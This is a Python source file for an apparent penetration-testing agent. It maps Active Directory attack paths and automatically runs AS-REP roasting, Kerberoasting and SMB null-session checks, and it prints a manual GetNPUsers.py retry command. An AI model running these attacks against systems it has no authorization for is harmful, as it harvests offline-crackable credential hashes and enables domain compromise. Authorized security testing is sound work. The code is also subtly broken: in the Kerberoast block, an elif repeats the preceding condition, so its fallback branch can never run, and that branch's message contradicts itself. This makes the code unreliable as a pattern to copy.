"""
ad_agent.py — ADAgent, Active Directory relationship analysis + exploitation.

Turns AD enumeration and SharpHound collections into attack-path findings.
This is the analysis half of AD work: it reads relationships that already
exist and reports what they compose into. It then drives the **exploitation**
half (tools/directory/ad_exploit.py) for the three misconfigurations that give
real proof without destructive action:

  * AS-REP roast    — accounts with DONT_REQ_PREAUTH give up an offline-crackable
                      $krb5asrep$ hash with NO credentials. Real, provable.
  * Kerberoast      — SPN accounts give up a TGS with engagement-supplied domain
                      credentials (memory['config'].ad.credentials).
  * SMB null session— empty-credential share enumeration tolerated by the host.

Availability contract, matching the rest of the tooling:

  * No AD signal on the target        -> should_run False, agent never scheduled.
  * AD present, no SharpHound data    -> runs on LDAP/SMB enumeration alone and
                                         reports what that thinner view supports.
  * SharpHound collection present     -> full graph, paths to Domain Admin.

Both halves are gated: exploitation runs only when the misconfiguration is
already *indicated* by enumeration (never blind guessing), and AS-REP roast /
null-session make no state change on the DC. Kerberoast is skipped cleanly when
no credentials are supplied.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any, Dict, List, Optional

from agents.base_agent import AgentFinding, AgentResult, BaseAgent

try:
    import ad_graph
except ImportError:  # pragma: no cover - the agent is inert without it
    ad_graph = None  # type: ignore[assignment]

# Ports and services that say "there is a domain here".
_AD_PORTS = {88, 389, 445, 464, 636, 3268, 3269, 5985}
_AD_SERVICES = {"ldap", "ldaps", "kerberos", "kerberos-sec", "microsoft-ds",
                "smb", "netbios-ssn", "globalcat", "kpasswd"}
_SMB_PORTS = {139, 445}


class ADAgent(BaseAgent):
    agent_name = "ad"

    # ── applicability ────────────────────────────────────────────────────────

    def should_run(self, smap: Dict[str, Any]) -> bool:
        """True when the target looks domain-joined."""
        if ad_graph is None or not isinstance(smap, dict):
            return False

        signals = smap.get("signals") or {}
        if isinstance(signals, dict):
            if signals.get("ad") or signals.get("ldap_naming_contexts"):
                return True
            if signals.get("domain") or signals.get("netbios_domain"):
                return True

        for service in smap.get("services") or []:
            if not isinstance(service, dict):
                continue
            if service.get("port") in _AD_PORTS:
                return True
            if str(service.get("service", "")).lower() in _AD_SERVICES:
                return True

        completed = smap.get("completed_actions") or []
        return "DIRECTORY_SERVICE_ENUMERATION" in completed

    # ── execution ────────────────────────────────────────────────────────────

    def run(self, target: str, smap: Dict[str, Any],
            memory: Dict[str, Any]) -> AgentResult:
        result = AgentResult(agent=self.agent_name, target=target, status="failed")
        if ad_graph is None:
            result.reasoning = "ad_graph module unavailable; skipping."
            result.status = "skipped"
            return result

        graph, source = self._build_graph(smap, memory)
        if not graph.nodes:
            result.status = "success"
            result.reasoning = ("Target looks domain-joined but no AD data was "
                                "available. Run SharpHound and set "
                                "ad.sharphound_dir for path analysis.")
            return result

        summary = graph.summary()
        result.tools_run = [source]

        findings: List[AgentFinding] = []
        findings.extend(self._path_findings(graph, memory, target))
        findings.extend(self._exposure_findings(graph, target))
        findings.extend(self._exploit_findings(graph, target, smap, memory))

        result.findings = findings
        result.status = "success"
        result.reasoning = (
            f"AD graph from {source}: {summary['nodes']} principals, "
            f"{summary['edges']} relationships, "
            f"{len(summary['high_value'])} high-value target(s). "
            f"{len(findings)} finding(s).")
        result.raw = {"ad_summary": summary}
        return result

    # ── graph construction ───────────────────────────────────────────────────

    def _build_graph(self, smap: Dict[str, Any],
                     memory: Dict[str, Any]) -> tuple:
        """Prefer a SharpHound collection; fall back to our own enumeration."""
        directory = self._sharphound_dir(memory)
        if directory and Path(directory).is_dir():
            graph = ad_graph.ingest_bloodhound_dir(directory)
            if graph.nodes:
                return graph, "bloodhound_parse"
        return ad_graph.ingest_ldap_evidence(smap), "ldap_enum"

    @staticmethod
    def _sharphound_dir(memory: Dict[str, Any]) -> str:
        config = (memory or {}).get("config") or {}
        section = config.get("ad") or {} if isinstance(config, dict) else {}
        if isinstance(section, dict) and section.get("sharphound_dir"):
            return str(section["sharphound_dir"])
        try:
            from utils import load_config
            section = (load_config() or {}).get("ad") or {}
            return str(section.get("sharphound_dir", "") or "")
        except Exception:  # noqa: BLE001
            return ""

    @staticmethod
    def _owned(memory: Dict[str, Any]) -> List[str]:
        """Principals already controlled, if the engagement recorded any."""
        owned = (memory or {}).get("owned_principals") or []
        return [str(o) for o in owned if o]

    # ── findings ─────────────────────────────────────────────────────────────

    def _path_findings(self, graph: Any, memory: Dict[str, Any],
                       target: str) -> List[AgentFinding]:
        owned = self._owned(memory)
        if owned:
            paths = graph.owned_paths(owned, limit=5)
            origin = "a controlled principal"
        else:
            # With nothing owned, the useful question is what an *ordinary*
            # account could reach — that is the domain's real blast radius.
            users = [n.name for n in graph.nodes.values()
                     if n.kind == "User" and n.enabled and not n.high_value]
            paths = []
            for user in users[:25]:
                paths.extend(graph.paths_to_high_value(user, limit=2))
            paths = sorted(paths, key=lambda p: p.cost)[:5]
            origin = "an ordinary domain user"

        findings: List[AgentFinding] = []
        for path in paths:
            weakest = path.weakest_link
            findings.append(AgentFinding(
                name=f"AD attack path to {path.nodes[-1]}",
                severity="CRITICAL" if path.cost <= 4 else "HIGH",
                confidence=75 if path.cost <= 4 else 60,
                url=target,
                description=(
                    f"A path exists from {origin} to the high-value principal "
                    f"{path.nodes[-1]} in {path.length} step(s) "
                    f"(cost {path.cost:.1f}).\n\n{path.describe()}\n\n"
                    f"The step most likely to fail is "
                    f"{weakest.kind if weakest else 'n/a'}; verify that one first. "
                    "Derived from collected relationships — it has not been walked."),
                agent=self.agent_name, tool="ad_graph",
                raw_output_excerpt=json.dumps(path.to_dict())[:500]))

        if paths:
            chokes = graph.choke_points(paths)
            if chokes:
                findings.append(AgentFinding(
                    name="AD choke points on multiple attack paths",
                    severity="MEDIUM", confidence=70, url=target,
                    description=(
                        "These principals sit on several distinct paths to "
                        "high-value targets, so remediating them breaks more "
                        "than one path at a time: "
                        + ", ".join(f"{n} ({c} path(s))" for n, c in chokes)),
                    agent=self.agent_name, tool="ad_graph"))
        return findings

    def _exposure_findings(self, graph: Any, target: str) -> List[AgentFinding]:
        """Account-level exposures visible from the graph alone."""
        findings: List[AgentFinding] = []

        roastable = graph.kerberoastable()
        if roastable:
            findings.append(AgentFinding(
                name="Kerberoastable service accounts",
                severity="MEDIUM", confidence=70, url=target,
                description=(
                    f"{len(roastable)} account(s) have an SPN set, so any "
                    "authenticated domain user can request a service ticket "
                    "and attempt to crack it offline: "
                    + ", ".join(n.name for n in roastable[:10])
                    + ". Reported from collected attributes; no tickets were "
                    "requested."),
                agent=self.agent_name, tool="ad_graph"))

        asrep = graph.asrep_roastable()
        if asrep:
            findings.append(AgentFinding(
                name="AS-REP roastable accounts (no Kerberos pre-auth)",
                severity="HIGH", confidence=75, url=target,
                description=(
                    f"{len(asrep)} account(s) do not require Kerberos "
                    "pre-authentication, so an encrypted blob can be requested "
                    "without any credentials and cracked offline: "
                    + ", ".join(n.name for n in asrep[:10])),
                agent=self.agent_name, tool="ad_graph"))

        delegation = graph.unconstrained_delegation()
        if delegation:
            findings.append(AgentFinding(
                name="Unconstrained delegation configured",
                severity="HIGH", confidence=70, url=target,
                description=(
                    f"{len(delegation)} principal(s) are trusted for "
                    "unconstrained delegation and therefore cache the TGTs of "
                    "any account that authenticates to them: "
                    + ", ".join(n.name for n in delegation[:10])),
                agent=self.agent_name, tool="ad_graph"))
        return findings

    # ── exploitation half ────────────────────────────────────────────────────

    def _exploit_findings(self, graph: Any, target: str, smap: Dict[str, Any],
                          memory: Dict[str, Any]) -> List[AgentFinding]:
        """Prove the three cheap AD exploitations the enumeration supports.

        No blind probing: each tool runs only when its prerequisite was already
        observed (pre-auth-disabled account / SPN account / SMB ports). AS-REP
        roast and null-session issuance are credential-less; Kerberoast needs
        engagement credentials and degrades to a clean report otherwise.
        """
        cfg = self._ad_config()
        domain = str(smap.get("ldap_domain") or cfg.get("domain") or "").strip()
        dc_ip = str(cfg.get("dc_ip") or "").strip() or _strip_host(target)
        findings: List[AgentFinding] = []

        # ── AS-REP roast (no credentials required) ───────────────────────
        asrep_names = [n.name for n in graph.asrep_roastable()]
        if asrep_names:
            tr = self._run_tool("asrep_roast", target, timeout=300,
                                users=asrep_names[:200], domain=domain, dc_ip=dc_ip)
            if tr and tr.status == "success":
                hashes = tr.results.get("hashes") or []
                if hashes:
                    findings.append(AgentFinding(
                        name="AS-REP roast — offline-crackable hashes captured",
                        agent=self.agent_name, tool="asrep_roast",
                        severity="CRITICAL", confidence=90, url=target,
                        description=(
                            f"{len(hashes)} account(s) with DONT_REQ_PREAUTH returned an "
                            f"AS-REP hash over an anonymous request (no credentials). "
                            f"Crack offline with: {tr.results.get('crack_command')}. "
                            "A cracked credential grants domain-authenticated access. "
                            f"Accounts: {', '.join(asrep_names[:5])}..."),
                        evidence_chain=[f"{n} -> $krb5asrep$ hash"
                                        for n in asrep_names[:5]],
                        false_positive_risk="LOW",
                        raw_output_excerpt=json.dumps(hashes[:3])[:500]))
                else:
                    findings.append(AgentFinding(
                        name="AS-REP roastable accounts (no pre-auth) — but no ticket returned",
                        agent=self.agent_name, tool="asrep_roast",
                        severity="MEDIUM", confidence=70, url=target,
                        description=(
                            f"{len(asrep_names)} account(s) do not require Kerberos "
                            "pre-authentication. The roast attempt returned no hash "
                            "(blocked by firewall/AS-REP policy or accounts disabled). "
                            "Retry manually: GetNPUsers.py -no-pass -usersfile users.txt "
                            f"{domain or 'DOMAIN'}/ -dc-ip {dc_ip}. "
                            + ", ".join(asrep_names[:10])),
                        false_positive_risk="MEDIUM"))

        # ── Kerberoast (engagement credentials required) ─────────────────
        kerber_names = [n.name for n in graph.kerberoastable()]
        creds = self._credentials(memory, cfg)
        if kerber_names:
            if creds["username"] and creds["password"]:
                tr_k = self._run_tool("kerberoast", target, timeout=300,
                                      user=creds["username"], password=creds["password"],
                                      domain=domain or creds["domain"], dc_ip=dc_ip)
                if tr_k and tr_k.status == "success":
                    tgs = tr_k.results.get("hashes") or []
                    if tgs:
                        findings.append(AgentFinding(
                            name="Kerberoast — service account TGS hashes captured",
                            agent=self.agent_name, tool="kerberoast",
                            severity="HIGH", confidence=85, url=target,
                            description=(
                                f"{len(tgs)} service account TGS ticket hash(es) "
                                f"extracted with the engagement credential {creds['username']}. "
                                f"Crack with: {tr_k.results.get('crack_command')}. "
                                + ", ".join(kerber_names[:5])),
                            evidence_chain=[f"{n} -> $krb5tgs$ hash"
                                            for n in kerber_names[:5]],
                            false_positive_risk="LOW",
                            raw_output_excerpt=json.dumps(tgs[:3])[:500]))
                elif tr_k and tr_k.status == "success":
                    findings.append(AgentFinding(
                        name="Kerberoastable service accounts (no TGS issued)",
                        agent=self.agent_name, tool="kerberoast",
                        severity="MEDIUM", confidence=70, url=target,
                        description=(
                            f"{len(kerber_names)} SPN account(s) are Kerberoastable "
                            f"{'(SPNs: ' + ', '.join(kerber_names[:5]) + ')'}. The "
                            "ticket request returned nothing — decrypt could not run. "
                            "Re-run with a domain credential. From collected attributes, "
                            "no tickets were requested."),
                        false_positive_risk="MEDIUM"))
            else:
                findings.append(AgentFinding(
                    name="Kerberoastable service accounts (no credentials supplied)",
                    agent=self.agent_name, tool="kerberoast",
                    severity="MEDIUM", confidence=65, url=target,
                    description=(
                        f"{len(kerber_names)} account(s) have an SPN and are Kerberoastable "
                        "with any authenticated user. Set ad.credentials (user/password/"
                        "domain) to have CyberSwarm request TGS hashes. "
                        + ", ".join(kerber_names[:10])),
                    false_positive_risk="MEDIUM"))

        # ── SMB null session (no credentials required) ───────────────────
        smb_ports = {s.get("port") for s in smap.get("services", [])} & _SMB_PORTS
        if smb_ports:
            tr_s = self._run_tool("smb_nullsess", target, timeout=120,
                                  ports=",".join(str(p) for p in sorted(smb_ports)))
            if tr_s and tr_s.status == "success":
                if tr_s.results.get("null_session"):
                    shares = tr_s.results.get("shares") or []
                    findings.append(AgentFinding(
                        name="SMB null session — anonymous share enumeration",
                        agent=self.agent_name, tool="smb_nullsess",
                        severity="HIGH", confidence=75, url=target,
                        description=(
                            f"Anonymous (null) SMB logon succeeded on port "
                            f"{', '.join(str(p) for p in sorted(smb_ports))} and "
                            f"enumerated {len(shares)} share(s): "
                            + ", ".join(shares[:10])
                            + ". An attacker can map these shares and read/write "
                            "wherever the guest identity has rights."),
                        evidence_chain=[f"null session -> {s}" for s in shares[:10]],
                        false_positive_risk="LOW",
                        raw_output_excerpt=json.dumps(tr_s.results)[:500]))
        return findings

    @staticmethod
    def _ad_config() -> Dict[str, Any]:
        try:
            from utils import load_config
            section = (load_config() or {}).get("ad") or {}
            return dict(section) if isinstance(section, dict) else {}
        except Exception:  # noqa: BLE001
            return {}

    @staticmethod
    def _credentials(memory: Dict[str, Any], cfg: Dict[str, Any]) -> Dict[str, str]:
        """Prefer memory-based creds, then config ad.credentials."""
        from_mem = (memory or {}).get("config") or {}
        mem_sec = from_mem.get("ad", {}) if isinstance(from_mem, dict) else {}
        creds = {
            "username": cfg.get("credentials_user") or mem_sec.get("credentials_user") or "",
            "password": cfg.get("credentials_password") or mem_sec.get("credentials_password") or "",
            "domain": cfg.get("domain") or mem_sec.get("domain") or "",
        }
        nested = cfg.get("credentials") or mem_sec.get("credentials") or {}
        if isinstance(nested, dict):
            for k in ("username", "password", "domain"):
                if nested.get(k):
                    creds[k] = nested[k]
        return creds


def _strip_host(target: str) -> str:
    return str(target).split("://", 1)[-1].split("/", 1)[0].split(":")[0]
